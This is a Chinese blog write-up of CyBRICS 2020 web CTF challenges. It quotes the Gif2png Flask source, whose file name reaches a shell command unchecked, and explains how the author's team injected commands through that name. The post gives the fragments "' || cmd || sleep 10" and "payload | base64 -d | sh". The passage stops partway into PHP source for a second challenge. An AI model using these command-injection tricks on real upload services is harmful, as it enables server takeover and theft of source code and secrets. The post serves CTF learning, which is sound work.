@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[cybrics 2020] web wp金砖五国CTF？感觉还是个大一点的比赛，看得到其他国家的队伍全程看题陪跑，比赛还没结束已经开始写wp了呜呜呜呜 Hunt用到了谷歌的验证码服务没翻墙做不了。。。。是不是该考虑一下充点钱了 Gif2png">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[cybrics 2020] web wp">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[cybrics%202020]%20wp.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[cybrics 2020] web wp金砖五国CTF？感觉还是个大一点的比赛，看得到其他国家的队伍全程看题陪跑，比赛还没结束已经开始写wp了呜呜呜呜 Hunt用到了谷歌的验证码服务没翻墙做不了。。。。是不是该考虑一下充点钱了 Gif2png">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-07-27T06:50:53.000Z">
+<meta property="article:modified_time" content="2020-07-27T06:51:40.634Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[cybrics%202020]%20wp.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[cybrics 2020] web wp | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[cybrics%202020]%20wp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [cybrics 2020] web wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-07-27 14:50:53 / 修改时间：14:51:40" itemprop="dateCreated datePublished" datetime="2020-07-27T14:50:53+08:00">2020-07-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5Bcybrics%202020%5D%20wp.html" class="post-meta-item leancloud_visitors" data-flag-title="[cybrics 2020] web wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5Bcybrics%202020%5D%20wp.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5Bcybrics%202020%5D%20wp.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="cybrics-2020-web-wp"><a href="#cybrics-2020-web-wp" class="headerlink" title="[cybrics 2020] web wp"></a>[cybrics 2020] web wp</h1><p>金砖五国CTF？感觉还是个大一点的比赛，看得到其他国家的队伍<br>全程看题陪跑，比赛还没结束已经开始写wp了呜呜呜呜</p>
+<h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>用到了谷歌的验证码服务没翻墙做不了。。。。是不是该考虑一下充点钱了</p>
+<h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>给了源码，一个python题</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'gif'</span><span class="token punctuation">}</span>
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'./uploads'</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'********************************'</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span> <span class="token operator">*</span> <span class="token number">1024</span>  <span class="token comment" spellcheck="true"># 500Kb</span>
+ffLaG <span class="token operator">=</span> <span class="token string">"cybrics{********************************}"</span>
+Bootstrap<span class="token punctuation">(</span>app<span class="token punctuation">)</span>
+logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token operator">and</span> filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token operator">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>
+            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">'No file part'</span><span class="token punctuation">)</span>
+            flash<span class="token punctuation">(</span><span class="token string">'No file part'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+
+        file <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
+        <span class="token keyword">if</span> file<span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
+            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">'No selected file'</span><span class="token punctuation">)</span>
+            flash<span class="token punctuation">(</span><span class="token string">'No selected file'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> <span class="token operator">not</span> allowed_file<span class="token punctuation">(</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>f<span class="token string">'Invalid file extension of file: {file.filename}'</span><span class="token punctuation">)</span>
+            flash<span class="token punctuation">(</span><span class="token string">'Invalid file extension'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> file<span class="token punctuation">.</span>content_type <span class="token operator">!=</span> <span class="token string">"image/gif"</span><span class="token punctuation">:</span>
+            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>f<span class="token string">'Invalid Content type: {file.content_type}'</span><span class="token punctuation">)</span>
+            flash<span class="token punctuation">(</span><span class="token string">'Content type is not "image/gif"'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> <span class="token operator">not</span> bool<span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$"</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token string">".."</span> <span class="token keyword">in</span> file<span class="token punctuation">.</span>filename<span class="token punctuation">:</span>
+            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>f<span class="token string">'Invalid symbols in filename: {file.content_type}'</span><span class="token punctuation">)</span>
+            flash<span class="token punctuation">(</span><span class="token string">'Invalid filename'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> file <span class="token operator">and</span> allowed_file<span class="token punctuation">(</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
+            file<span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+            mime_type <span class="token operator">=</span> filetype<span class="token punctuation">.</span>guess_mime<span class="token punctuation">(</span>f<span class="token string">'uploads/{file.filename}'</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> mime_type <span class="token operator">!=</span> <span class="token string">"image/gif"</span><span class="token punctuation">:</span>
+                logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>f<span class="token string">'Invalid Mime type: {mime_type}'</span><span class="token punctuation">)</span>
+                flash<span class="token punctuation">(</span><span class="token string">'Mime type is not "image/gif"'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+
+            uid <span class="token operator">=</span> str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>f<span class="token string">"uploads/{uid}"</span><span class="token punctuation">)</span>
+
+            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>f<span class="token string">"Created: {uid}. Command: ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\""</span><span class="token punctuation">)</span>
+
+            command <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>f<span class="token string">"ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\""</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+            command<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>
+            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>command<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
+
+            flash<span class="token punctuation">(</span><span class="token string">'Successfully saved'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">,</span> uid<span class="token operator">=</span>uid<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"form.html"</span><span class="token punctuation">)</span>
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/result/&lt;uid>/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">result</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> image <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>f<span class="token string">"uploads/{uid}"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        mime_type <span class="token operator">=</span> filetype<span class="token punctuation">.</span>guess<span class="token punctuation">(</span>str<span class="token punctuation">(</span>Path<span class="token punctuation">(</span><span class="token string">"uploads"</span><span class="token punctuation">)</span> <span class="token operator">/</span> uid <span class="token operator">/</span> image<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> image<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">".png"</span><span class="token punctuation">)</span> <span class="token operator">and</span> mime_type <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> mime_type<span class="token punctuation">.</span>EXTENSION <span class="token operator">==</span> <span class="token string">"png"</span><span class="token punctuation">:</span>
+            images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>image<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"result.html"</span><span class="token punctuation">,</span> uid<span class="token operator">=</span>uid<span class="token punctuation">,</span> images<span class="token operator">=</span>images<span class="token punctuation">)</span>
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/uploads/&lt;uid>/&lt;image>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">image</span><span class="token punctuation">(</span>uid<span class="token punctuation">,</span> image<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
+    dir <span class="token operator">=</span> str<span class="token punctuation">(</span>Path<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> uid<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>dir<span class="token punctuation">,</span> image<span class="token punctuation">)</span>
+
+
+@app<span class="token punctuation">.</span>errorhandler<span class="token punctuation">(</span><span class="token number">413</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">request_entity_too_large</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">"File is too large"</span><span class="token punctuation">,</span> <span class="token number">413</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> threaded<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+</code></pre>
+<p>整体代码不是很长，三个路由，一个处理gif为png，一个展示，最后一个也是展示功能</p>
+<p>根路由对上传的文件做了一万次是不是gif的判断，不好绕过的就是mime_type的判断，这个用了filetype这个库去实现，然后还对文件名有一定的限制<br>最后进一个危险函数subprocess.Popen，使用ffmpeg处理图像，但是filename除了之前的限制完全可控</p>
+<p>两个思路，利用ffmpeg的漏洞，或是命令注入</p>
+<h3 id="思路一（失败）"><a href="#思路一（失败）" class="headerlink" title="思路一（失败）"></a>思路一（失败）</h3><p>查了一下ffmpeg的洞，发现几年前有一个处理AVI视频格式的文件时在字幕文件中插入恶意数据导致ssrf的，如果能行自然能做<br>但是，这个题对gif的限制很大，为此我还专门去看了一下filetype是怎么判断的（以没看懂告终，然后师傅就做出来了）</p>
+<h3 id="思路二（命令注入）"><a href="#思路二（命令注入）" class="headerlink" title="思路二（命令注入）"></a>思路二（命令注入）</h3><p>subprocess.Popen显然是一个超级危险函数，并且filename还基本上可控，引号也可有，可以重新闭合一下，但是&#x2F;;等符号没有，分隔命令指定目录什么的又不行，执行的回显我们也看不到，现在给的符号不足以反弹shell，并且经过测试靶机也访问不了外网（大概），但是师傅使用|超级管道符和或的功能完成了命令注入</p>
+<h4 id="trick1"><a href="#trick1" class="headerlink" title="trick1"></a>trick1</h4><p>Linux命令行或语句连接一系列命令的时候，比如<code>aaa || ls || bbb</code>的时候，是从左往右执行执行第一个能执行的命令，并且不再执行之后的命令，这样子就可以把之前的命令随便闭合并且让他不能用，执行我们后面拼接的命令<br>因此可以使用<code>&#39; || cmd || sleep 10</code>来测试cmd是否可用，试了一下curl本地好像可以，但是访问不了外网（可能）</p>
+<h4 id="trick2"><a href="#trick2" class="headerlink" title="trick2"></a>trick2</h4><p>管道符连接命令，面对不能出现的字符，当然是编码绕过他，<code>payload | base64 -d | sh</code><br>将payloadbase64编码之后完美绕过限制，管道到base64解码，再管道到sh执行，tql</p>
+<p>从源码中可以得到upload目录就在当前目录下，并且肯定可写，而&#x2F;uploads&#x2F;&lt;uid&gt;&#x2F;&lt;image&gt;这个路由刚好可以读取对应内容，所以payload将main.py写进自己UID对应的目录下，用png格式保存就行，然后访问一下就可以看到源码获取flag了</p>
+<h2 id="WoC"><a href="#WoC" class="headerlink" title="WoC"></a>WoC</h2><p>也是给了源码的题，直接给源码的都是好人啊（不像某些奇怪的比赛喜欢藏源码让你去robots.txt或者www.tar.gz等地方找<br>给了一个超大的框架，大概就是可以使用不同的计算器图片，然后功能也就是一个计算器。<br>框架太大了，真的理不清，并且html和PHP嵌套各种require各种操作，太高级了我这个萌新没接触过，试了好久才试出来整个网站大概是怎么运行的<br>登入登出和数据库毫无关系，就是根据用户名给一个session给一个UUID，感觉不注册也随便登录。。。然后还有几个工具界面，require过来require过去的，还有各种跳转<br>主要内容集中在calc.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token operator">!</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'template'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$userid</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'template'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'#^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$#s'</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/templates/$template.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$field</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?>[^()]+|(?4))*\)[^()]*)*)$#s'</span><span class="token punctuation">,</span> <span class="token variable">$field</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">"BAD"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
